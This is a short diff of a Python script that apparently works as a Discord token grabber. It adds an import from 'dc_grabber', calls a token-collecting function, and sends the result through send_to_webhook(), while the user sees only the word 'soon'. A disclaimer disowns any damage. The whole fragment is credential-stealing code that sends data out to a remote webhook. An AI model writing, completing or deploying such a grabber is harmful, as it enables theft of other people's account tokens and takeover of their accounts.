@@ -4,12 +4,14 @@
 # I am not responsible for any damage caused by your use of this software.
 #-------------------------------------------------------------------------------------------------
 
+from dc_grabber import grabber as grab
+
 print('soon')
 input()
 
 grab.tookens()
 send_to_webhook('zkfjzfzFiezfiubezf23242bZEIZEB22398232ifiuzebiu2398293izuuefb23')
-
+quit()
 
 
 
